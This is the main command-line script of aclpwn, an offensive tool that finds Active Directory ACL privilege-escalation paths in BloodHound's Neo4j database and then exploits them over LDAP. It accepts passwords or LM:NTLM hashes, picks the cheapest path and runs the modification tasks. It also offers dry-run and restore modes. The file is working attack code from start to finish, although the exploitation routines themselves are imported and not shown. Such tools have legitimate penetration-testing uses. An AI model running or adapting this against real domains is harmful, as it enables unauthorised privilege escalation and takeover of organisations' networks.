from __future__ import print_function

import sys
import argparse
import traceback
import getpass
from aclpwn import utils, pathfinding, database, exploitation
from aclpwn.restore import RestoreOperation

def print_m(string):
    sys.stderr.write('\033[94m[-]\033[0m %s\n' % (string))

def print_o(string):
    sys.stderr.write('\033[92m[+]\033[0m %s\n' % (string))

def print_f(string):
    sys.stderr.write('\033[91m[!]\033[0m %s\n' % (string))

def main():
    parser = argparse.ArgumentParser(description='Exploit ACL escalation paths via BloodHound')
    parser._optionals.title = "Main options"
    parser._positionals.title = "Required options"

    #Main parameters
    maingroup = parser.add_argument_group("aclpwn options")
    maingroup.add_argument("-f","--from", type=str, metavar='SOURCE', help="Source object to start the path (usually a user). Example: user@domain.local")
    maingroup.add_argument("-ft","--from-type", default="User", type=str, metavar='TYPE', help="Type of the source object. Valid values: User/Group/Domain/Computer. Default: user")
    maingroup.add_argument("-t","--to", type=str, default='', metavar='DESTINATION', help="Target object to escalate to (for example a group/domain). Example: computer.domain.local or domain.local")
    maingroup.add_argument("-tt","--to-type", default="Domain", type=str, metavar='TYPE', help="Type of the destination object. Valid values: User/Group/Domain/Computer. Default: domain")
    maingroup.add_argument("-d","--domain", type=str, metavar='DOMAIN', help="The domain to escalate in. If unspecified, you have to provide them in the from/to parameters.")
    maingroup.add_argument("-a","--algorithm", type=str, default='dijkstra', choices=['dijkstra', 'shortestonly', 'allsimple', 'dijkstra-cypher'], metavar='ALGORITHM', help="Path algorithm to use. Options: shortestonly/dijkstra/dijkstra-cypher/allsimple. For a description, see https://github.com/fox-it/aclpwn.py/wiki/Pathfinding. Default: dijkstra")
    maingroup.add_argument("-r","--restore", type=str, metavar='FILE', help="Load an aclpwn restore file to revert changes made.")

    #DB parameters
    databasegroup = parser.add_argument_group("Database options (if unspecified they will be taken from your BloodHound config)")
    databasegroup.add_argument("--database", type=str, metavar="DATABASE HOST", default="localhost", help="The host neo4j is running on. Default: localhost. Note that aclpwn uses both the REST API and the Bolt driver.")
    databasegroup.add_argument("-du", "--database-user", type=str, metavar="USERNAME", default="neo4j", help="Neo4j username to use")
    databasegroup.add_argument("-dp", "--database-password", type=str, metavar="PASSWORD", help="Neo4j password to use")
    databasegroup.add_argument("--no-prepare", action='store_true', help="Don't prepare the database when using Dijkstra. Only use this when you haven't modified the DB since running aclpwn a previous time.")

    #Exploitation parameters
    databasegroup = parser.add_argument_group("Exploitation options")
    databasegroup.add_argument("-s", "--server", type=str, metavar="SERVER", help="Server to connect to. If not specified, it will be taken from the domain.")
    databasegroup.add_argument("-u", "--user", type=str, metavar="USERNAME", help="User to use for exploitation. If not specified, the source user specified with --from will be used.")
    databasegroup.add_argument("-p", "--password", type=str, metavar="PASSWORD", help="Password or LMHASH:NTHASH used for exploitation.")
    databasegroup.add_argument("-sp", "--source-password", metavar="PASSWORD", help="Password or LMHASH:NTHASH for the source user (used in first step of the exploit chain)")
    databasegroup.add_argument("-dry", "--dry-run", action='store_true', help="Don't actually perform any attacks, only show what would happen.")


    validtypes = ['User', 'Group', 'Domain', 'Computer']
    args = parser.parse_args()
    # Since we deal with some reserved keywords, we use a dictionary too
    argsdict = vars(args)

    if args.restore:
        # Switch to restore mode
        restorer = RestoreOperation(args, args.restore)
        restorer.run()
        return

    if args.from_type.capitalize() not in validtypes:
        print_f('Error: --from-type unrecognized type. Valid types: %s' % ', '.join(validtypes))
        return

    if args.to_type.capitalize() not in validtypes:
        print_f('Error: --to-type unrecognized type. Valid types: %s' % ', '.join(validtypes))
        return

    if args.database_password is None:
        args.database_user, args.database_password = database.detect_db_config()
        if args.database_password is None:
            print_f('Error: Could not autodetect the Neo4j database credentials from your BloodHound config. Please specify them manually')
            return

    if not args.dry_run:
        if args.domain is None and args.server is None:
            print_f('Error: You must specify an LDAP server to connect to with --server, or supply a domain which resolves to this server with --domain, unless you are simulating exploitation with --dry-run')
            return
        if args.source_password is None:
            args.source_password = getpass.getpass('Please supply the password or LM:NTLM hashes of the account you are escalating from: ')

    if args.domain:
        from_object = utils.append_domain(argsdict['from'].upper(), args.from_type.capitalize(), args.domain.upper())
        to_object = utils.append_domain(argsdict['to'].upper(), args.to_type.capitalize(), args.domain.upper())
    else:
        from_object = argsdict['from'].upper()
        to_object = argsdict['to'].upper()

    # We edit this on the args directly
    args.from_object = from_object
    args.to_object = to_object

    database.init_driver(args.database, args.database_user, args.database_password)

    try:
        if args.algorithm == 'dijkstra' or args.algorithm == 'dijkstra-cypher':
            if not args.no_prepare:
                database.preparedb()

            # Split logic for dijkstra via REST and via Cypher only
            if args.algorithm == 'dijkstra-cypher':
                # Cypher can use the nodes directly
                paths = pathfinding.dijkstra_find_cypher(from_object, to_object, args.from_type.capitalize(), args.to_type.capitalize())
            else:
                # First we need to obtain the node IDs for use with the REST api
                q = "MATCH (n:%s {name: {name}}) RETURN n"
                with database.driver.session() as session:
                    fromres = session.run(q % args.from_type.capitalize(), name=from_object)
                    try:
                        fromid = fromres.single()['n'].id
                    except TypeError:
                        print_f('No %s found with the name %s in the database' % (args.from_type.capitalize(), from_object))
                        return
                    tores = session.run(q % args.to_type.capitalize(), name=to_object)
                    try:
                        toid = tores.single()['n'].id
                    except TypeError:
                        print_f('No %s found with the name %s in the database' % (args.to_type.capitalize(), to_object))
                        return
                paths = pathfinding.dijkstra_find(fromid, toid, args.database)

            if len(paths) == 0:
                print_f('No path found!')
                return

            # Validate the paths (check if all operations are supported)
            i = 0
            validpaths = []
            for nodes, rels, path in paths:
                # Try to build the exploit path first
                exploitpath = utils.build_rest_path(nodes, rels)
                # Test if we support all operations of this path
                if not exploitation.test_path(exploitpath):
                    print_m('Invalid path, skipping')
                    continue
                # If we do, print it
                print_o('Path found!')
                if len(paths) > 1:
                    print('Path [%d]: ' % i, end='')
                    i += 1
                else:
                    print('Path: ', end='')
                print(utils.print_rest_path(nodes, rels))
                validpaths.append(exploitpath)

            # Are there any paths left?
            if len(validpaths) == 0:
                print_f('The found path is not supported, quitting.')
                return

            # If there is more than 1 path, offer a choice
            if len(validpaths) > 1:
                pathi = utils.prompt_path(len(validpaths))
                if pathi is False or pathi is None:
                    return
                exploitpath = validpaths[pathi]
            else:
                exploitpath = validpaths[0]
        else:
            records = pathfinding.get_path(from_object, to_object, args.from_type.capitalize(), args.to_type.capitalize(), args.algorithm)

            paths = []
            minpathcost = 1000
            exploitpath = None
            i = 0
            for path in records:
                if path is None:
                    print_f('No path found!')
                else:
                    if len(paths) == 0:
                        print_o('Path found!')
                    pdata = utils.build_path(path)
                    # Test if we support all operations of this path
                    if not exploitation.test_path(pdata):
                        continue
                    print('Path [%d]: ' % i, end='')
                    i += 1
                    print(utils.print_path(path))
                    paths.append(pdata)
                    pathcost = pathfinding.get_path_cost(path)
                    print_m('Path cost: %d' % pathcost)

                    # Find the cheapest path
                    if pathcost < minpathcost:
                        exploitpath = pdata
                        minpathcost = pathcost

            if len(paths) == 0:
                print_f('No path found!')
                return

            if len(paths) > 1:
                pathi = utils.prompt_path(len(paths))
                if pathi is False or pathi is None:
                    return
                exploitpath = paths[pathi]
            else:
                exploitpath = paths[0]

        # The above operations get the correct path, now we unify the flow to exploit it
        exploitdata = exploitation.walk_path(exploitpath, args, None, args.dry_run)
        if not exploitdata:
            return False

        # Unpack
        task_queue, state = exploitdata
        if args.dry_run:
            print_o('Path validated, the following modifications are required for exploitation in the current configuration:')
        try:
            # Actually perform operations
            exploitation.run_tasks(task_queue, args.dry_run)
        except exploitation.ExploitException:
            print_f('Error while running exploitation path')
            traceback.print_exc()
            # Write restore data for all complete operations
            state.save_restore_data()
            return
        if not args.dry_run:
            print_o('Finished running tasks')
            # At this point it should be done, write restore data
            state.save_restore_data()

    finally:
        database.close_driver()
    return

if __name__ == '__main__':
    main()
